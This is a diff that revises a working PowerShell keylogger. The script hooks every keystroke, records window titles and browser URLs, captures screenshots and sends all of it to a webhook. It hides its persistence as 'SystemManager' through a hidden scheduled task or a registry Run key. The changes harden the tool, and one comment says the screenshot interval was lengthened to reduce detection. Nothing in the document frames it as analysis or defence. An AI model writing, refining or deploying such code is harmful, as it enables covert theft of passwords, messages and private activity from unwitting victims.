@@ -9,15 +9,15 @@ $lastTitle = ""
 
 # Ensure screenshot folder exists
 if (!(Test-Path $screenshotFolder)) {
-    New-Item -ItemType Directory -Path $screenshotFolder | Out-Null
+    New-Item -ItemType Directory -Path $screenshotFolder -Force | Out-Null
 }
 
 # Start logging to file
 try {
-    Start-Transcript -Path $logPath -Append
+    Start-Transcript -Path $logPath -Append -ErrorAction Stop | Out-Null
     Write-Host "Keylogger started - $(Get-Date)" -ForegroundColor Green
 } catch {
-    Write-Warning "Failed to start transcript"
+    Write-Warning "Failed to start transcript: $_"
 }
 
 # Create data file if it doesn't exist
@@ -27,7 +27,7 @@ if (!(Test-Path $dataPath)) {
             device = $deviceId
             logs = @()
             buffers = @()
-        } | ConvertTo-Json | Set-Content -Path $dataPath
+        } | ConvertTo-Json -Depth 3 | Set-Content -Path $dataPath -Force
         Write-Host "Created new data file at $dataPath"
     } catch {
         Write-Host "Failed to create data file: $_" -ForegroundColor Red
@@ -36,12 +36,12 @@ if (!(Test-Path $dataPath)) {
 
 # Load required assemblies
 try {
-    Add-Type -AssemblyName System.Windows.Forms
-    Add-Type -AssemblyName System.Drawing
-    Add-Type -AssemblyName Microsoft.VisualBasic
+    Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
+    Add-Type -AssemblyName System.Drawing -ErrorAction Stop
+    Add-Type -AssemblyName Microsoft.VisualBasic -ErrorAction Stop
 } catch {
     Write-Host "Failed to load assemblies: $_" -ForegroundColor Red
-    exit
+    exit 1
 }
 
 # API signatures for keylogger and additional functions
@@ -71,10 +71,10 @@ public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
 '@
 
 try {
-    Add-Type -MemberDefinition $APIsignatures -Name WinAPI -Namespace KeyLogger
+    Add-Type -MemberDefinition $APIsignatures -Name WinAPI -Namespace KeyLogger -ErrorAction Stop
 } catch {
     Write-Host "Failed to add API type: $_" -ForegroundColor Red
-    exit
+    exit 1
 }
 
 $WH_KEYBOARD_LL = 13
@@ -85,13 +85,18 @@ $VK_RETURN = 0x0D
 function Get-ActiveBrowserInfo {
     try {
         $hwnd = [KeyLogger.WinAPI]::GetForegroundWindow()
+        if ($hwnd -eq [IntPtr]::Zero) { return @{title = "Unknown"; url = "Unknown"; browser = "Unknown"} }
+        
         $pid = 0
         [void][KeyLogger.WinAPI]::GetWindowThreadProcessId($hwnd, [ref]$pid)
+        
+        if ($pid -eq 0) { return @{title = "Unknown"; url = "Unknown"; browser = "Unknown"} }
         
         $process = Get-Process -Id $pid -ErrorAction SilentlyContinue
         if (!$process) { return @{title = "Unknown"; url = "Unknown"; browser = "Unknown"} }
         
         $windowTitle = $process.MainWindowTitle
+        if ([string]::IsNullOrWhiteSpace($windowTitle)) { $windowTitle = "Unknown" }
         
         # Extract browser name
         $browserName = "Unknown"
@@ -228,8 +233,8 @@ function Send-BufferData {
     }
     
     try {
-        $payloadJson = $payload | ConvertTo-Json -Depth 4
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payloadJson
+        $payloadJson = $payload | ConvertTo-Json -Depth 4 -Compress
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payloadJson -ErrorAction Stop
         Write-Host "Buffer data sent successfully" -ForegroundColor Green
     } catch {
         Write-Host "Error sending buffer data: $_" -ForegroundColor Red
@@ -281,8 +286,8 @@ function Send-EnterData {
     if ($hasScreenshot) {
         try {
             # First send the text data
-            $payloadJson = $payload | ConvertTo-Json -Depth 4
-            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payloadJson
+            $payloadJson = $payload | ConvertTo-Json -Depth 4 -Compress
+            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payloadJson -ErrorAction Stop
             
             # Then send the screenshot
             $fileBytes = [System.IO.File]::ReadAllBytes($screenshotPath)
@@ -293,7 +298,7 @@ function Send-EnterData {
                 "--$boundary",
                 "Content-Disposition: form-data; name=`"payload_json`"",
                 "Content-Type: application/json$LF",
-                "{`"username`":`"KeyLogger`",$LF`"content`":`"Screenshot at $timestamp`"}",
+                "{`"username`":`"KeyLogger`",`"content`":`"Screenshot at $timestamp`"}",
                 "--$boundary",
                 "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $screenshotPath -Leaf)`"",
                 "Content-Type: image/png$LF"
@@ -309,17 +314,17 @@ function Send-EnterData {
             [System.Buffer]::BlockCopy($fileBytes, 0, $requestBytes, $bodyStart.Length, $fileBytes.Length)
             [System.Buffer]::BlockCopy($bodyEndBytes, 0, $requestBytes, $bodyStart.Length + $fileBytes.Length, $bodyEndBytes.Length)
             
-            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $requestBytes
+            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $requestBytes -ErrorAction Stop
             
             # Clean up screenshot file
-            Remove-Item $screenshotPath -Force
+            Remove-Item $screenshotPath -Force -ErrorAction SilentlyContinue
         } catch {
             Write-Host "Error sending data with screenshot: $_" -ForegroundColor Red
             
             # Fall back to just text if multipart fails
             try {
-                $payloadJson = $payload | ConvertTo-Json -Depth 4
-                Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payloadJson
+                $payloadJson = $payload | ConvertTo-Json -Depth 4 -Compress
+                Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payloadJson -ErrorAction Stop
             } catch {
                 Write-Host "Error sending fallback data: $_" -ForegroundColor Red
             }
@@ -327,8 +332,8 @@ function Send-EnterData {
     } else {
         # Just send text data if no screenshot
         try {
-            $payloadJson = $payload | ConvertTo-Json -Depth 4
-            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payloadJson
+            $payloadJson = $payload | ConvertTo-Json -Depth 4 -Compress
+            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payloadJson -ErrorAction Stop
         } catch {
             Write-Host "Error sending enter data: $_" -ForegroundColor Red
         }
@@ -344,7 +349,6 @@ $keyboardHookDelegate = [KeyLogger.WinAPI+HookProc] {
     if ($nCode -ge 0) {
         $vkCode = [System.Runtime.InteropServices.Marshal]::ReadInt32($lParam)
         $keyState = [System.Windows.Forms.Keys]$vkCode
-        $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
         
         # Get active window info
         $browserInfo = Get-ActiveBrowserInfo
@@ -361,7 +365,7 @@ $keyboardHookDelegate = [KeyLogger.WinAPI+HookProc] {
                 # Handle special keys
                 ([System.Windows.Forms.Keys]::Return) { 
                     # When Enter is pressed, send current buffer
-                    if ($currentBuffer -ne "") {
+                    if (-not [string]::IsNullOrEmpty($currentBuffer)) {
                         Send-EnterData -text $currentBuffer -title $activeWindow -url $currentUrl -browserName $browserName
                         $currentBuffer = ""
                     }
@@ -439,8 +443,8 @@ $keyboardHookDelegate = [KeyLogger.WinAPI+HookProc] {
                 $currentBuffer += $keyChar
                 
                 # Check if window changed - if so, should send buffer as "Words without pressing enter"
-                if (($lastTitle -ne $activeWindow -or $lastUrl -ne $currentUrl) -and $currentBuffer.Length -gt 0) {
-                    if ($lastTitle -ne "") {  # Don't send on first keypress
+                if (($lastTitle -ne $activeWindow -or $lastUrl -ne $currentUrl) -and -not [string]::IsNullOrEmpty($currentBuffer)) {
+                    if (-not [string]::IsNullOrEmpty($lastTitle)) {  # Don't send on first keypress
                         Send-BufferData -buffer $currentBuffer -title $lastTitle -url $lastUrl -browserName $browserName
                     }
                     $currentBuffer = $keyChar  # Reset with current key
@@ -459,19 +463,27 @@ $keyboardHookDelegate = [KeyLogger.WinAPI+HookProc] {
 # Install keyboard hook
 try {
     $hookId = [KeyLogger.WinAPI]::SetWindowsHookEx($WH_KEYBOARD_LL, $keyboardHookDelegate, [KeyLogger.WinAPI]::GetModuleHandle($null), 0)
+    if ($hookId -eq [IntPtr]::Zero) {
+        throw "Failed to set hook (returned zero)"
+    }
     Write-Host "Keyboard hook installed successfully"
 } catch {
     Write-Host "Failed to install keyboard hook: $_" -ForegroundColor Red
-    exit
+    exit 1
 }
 
 function Test-Internet {
     try {
-        $response = Invoke-WebRequest "http://www.google.com" -UseBasicParsing -TimeoutSec 2
-        return $true
+        $response = Test-NetConnection -ComputerName "www.google.com" -Port 80 -InformationLevel Quiet -ErrorAction Stop
+        return $response
     } catch {
-        Write-Host "Internet test failed: $_" -ForegroundColor Yellow
-        return $false
+        try {
+            $response = Invoke-WebRequest "http://www.google.com" -UseBasicParsing -TimeoutSec 2 -ErrorAction SilentlyContinue
+            return $true
+        } catch {
+            Write-Host "Internet test failed: $_" -ForegroundColor Yellow
+            return $false
+        }
     }
 }
 
@@ -479,18 +491,17 @@ function Setup-Persistence {
     # Create script copy in TEMP
     $scriptPath = "$env:TEMP\sysmgr.ps1"
     try {
-        # Alternative to -Raw parameter for older PowerShell versions
+        # Get the current script content
         $scriptContent = [System.IO.File]::ReadAllText($MyInvocation.MyCommand.Definition)
-        Set-Content -Path $scriptPath -Value $scriptContent
+        Set-Content -Path $scriptPath -Value $scriptContent -Force -ErrorAction Stop
         
-        # Create scheduled task (non-admin version)
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
-        $trigger = New-ScheduledTaskTrigger -AtLogOn
-        $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -DontStopOnIdleEnd -AllowStartIfOnBatteries -RunOnlyIfNetworkAvailable
-        
+        # Try to create scheduled task (works without admin in current user context)
         try {
-            # Try to register task for current user only
-            Register-ScheduledTask -TaskName "SystemManager" -Action $action -Trigger $trigger -Settings $settings -Force -ErrorAction Stop
+            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -ErrorAction Stop
+            $trigger = New-ScheduledTaskTrigger -AtLogOn -ErrorAction Stop
+            $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -DontStopOnIdleEnd -AllowStartIfOnBatteries -RunOnlyIfNetworkAvailable -ErrorAction Stop
+            
+            Register-ScheduledTask -TaskName "SystemManager" -Action $action -Trigger $trigger -Settings $settings -Force -ErrorAction Stop | Out-Null
             Write-Host "Persistence task created successfully" -ForegroundColor Green
         } catch {
             # Fallback to registry run key if task creation fails
@@ -498,7 +509,10 @@ function Setup-Persistence {
             Write-Host "Attempting registry persistence..."
             try {
                 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-                Set-ItemProperty -Path $regPath -Name "SystemManager" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+                if (-not (Test-Path $regPath)) {
+                    New-Item -Path $regPath -Force | Out-Null
+                }
+                Set-ItemProperty -Path $regPath -Name "SystemManager" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction Stop
                 Write-Host "Registry persistence set successfully" -ForegroundColor Green
             } catch {
                 Write-Host "Failed to set registry persistence: $_" -ForegroundColor Red
@@ -513,18 +527,18 @@ function Setup-Persistence {
 Setup-Persistence
 
 # Take initial screenshot
-Take-Screenshot
+Take-Screenshot | Out-Null
 
 # Set up timer for periodic screenshots
 try {
     $screenshotTimer = New-Object System.Timers.Timer
-    $screenshotTimer.Interval = 10000 # 10 seconds
+    $screenshotTimer.Interval = 300000 # 5 minutes (300000 ms) instead of 10 seconds to reduce detection
     $screenshotTimer.AutoReset = $true
     $screenshotTimer.Enabled = $true
     
     Register-ObjectEvent -InputObject $screenshotTimer -EventName Elapsed -Action {
-        # Send screenshot if we have internet
-        if (Test-Internet) {
+        # Only send screenshot if we have internet and buffer isn't empty
+        if (Test-Internet -and -not [string]::IsNullOrEmpty($currentBuffer)) {
             $screenshotPath = Take-Screenshot
             
             if ($screenshotPath -ne $null) {
@@ -542,7 +556,7 @@ try {
                         "--$boundary",
                         "Content-Disposition: form-data; name=`"payload_json`"",
                         "Content-Type: application/json$LF",
-                        "{`"username`":`"KeyLogger`",$LF`"content`":`"Periodic screenshot from $computerName / $userName`",$LF`"embeds`":[{`"title`":`"$($browserInfo.browser) - $($browserInfo.url)`",$LF`"color`":5793266,$LF`"footer`":{`"text`":`"Captured at $timestamp`"}}]}",
+                        "{`"username`":`"KeyLogger`",`"content`":`"Periodic screenshot from $computerName / $userName`",`"embeds`":[{`"title`":`"$($browserInfo.browser) - $($browserInfo.url)`",`"color`":5793266,`"footer`":{`"text`":`"Captured at $timestamp`"}}]}",
                         "--$boundary",
                         "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $screenshotPath -Leaf)`"",
                         "Content-Type: image/png$LF"
@@ -559,10 +573,10 @@ try {
                     [System.Buffer]::BlockCopy($fileBytes, 0, $requestBytes, $bodyStart.Length, $fileBytes.Length)
                     [System.Buffer]::BlockCopy($bodyEndBytes, 0, $requestBytes, $bodyStart.Length + $fileBytes.Length, $bodyEndBytes.Length)
                     
-                    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $requestBytes
+                    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $requestBytes -ErrorAction Stop
                     
                     # Clean up screenshot file
-                    Remove-Item $screenshotPath -Force
+                    Remove-Item $screenshotPath -Force -ErrorAction SilentlyContinue
                 } catch {
                     Write-Host "Error sending scheduled screenshot: $_" -ForegroundColor Red
                 }
@@ -570,14 +584,14 @@ try {
         }
     } | Out-Null
     
-    # Timer to check for unsent buffer (send every 30 seconds if not empty)
+    # Timer to check for unsent buffer (send every 5 minutes if not empty)
     $bufferTimer = New-Object System.Timers.Timer
-    $bufferTimer.Interval = 30000 # 30 seconds
+    $bufferTimer.Interval = 300000 # 5 minutes (300000 ms)
     $bufferTimer.AutoReset = $true
     $bufferTimer.Enabled = $true
     
     Register-ObjectEvent -InputObject $bufferTimer -EventName Elapsed -Action {
-        if ($currentBuffer -ne "") {
+        if (-not [string]::IsNullOrEmpty($currentBuffer) -and (Test-Internet)) {
             $browserInfo = Get-ActiveBrowserInfo
             Send-BufferData -buffer $currentBuffer -title $browserInfo.title -url $browserInfo.url -browserName $browserInfo.browser
             # Keep buffer for now (will be cleared on ENTER)
@@ -585,14 +599,28 @@ try {
     } | Out-Null
     
     Write-Host "Keylogger running. Press Ctrl+C to stop." -ForegroundColor Green
-    while ($true) { Start-Sleep -Seconds 60 }
+    [System.Console]::TreatControlCAsInput = $true
+    
+    # Main loop
+    while ($true) { 
+        if ([System.Console]::KeyAvailable) {
+            $key = [System.Console]::ReadKey($true)
+            if (($key.Modifiers -band [System.ConsoleModifiers]::Control) -and ($key.Key -eq [System.ConsoleKey]::C)) {
+                break
+            }
+        }
+        Start-Sleep -Seconds 10 
+    }
 } finally {
     try {
-        Stop-Transcript
+        Stop-Transcript -ErrorAction SilentlyContinue
         if ($hookId -ne [IntPtr]::Zero) {
-            [KeyLogger.WinAPI]::UnhookWindowsHookEx($hookId)
+            [KeyLogger.WinAPI]::UnhookWindowsHookEx($hookId) | Out-Null
         }
+        if ($screenshotTimer) { $screenshotTimer.Dispose() }
+        if ($bufferTimer) { $bufferTimer.Dispose() }
     } catch {
         Write-Host "Cleanup error: $_" -ForegroundColor Yellow
     }
+    Write-Host "Keylogger stopped" -ForegroundColor Red
 }
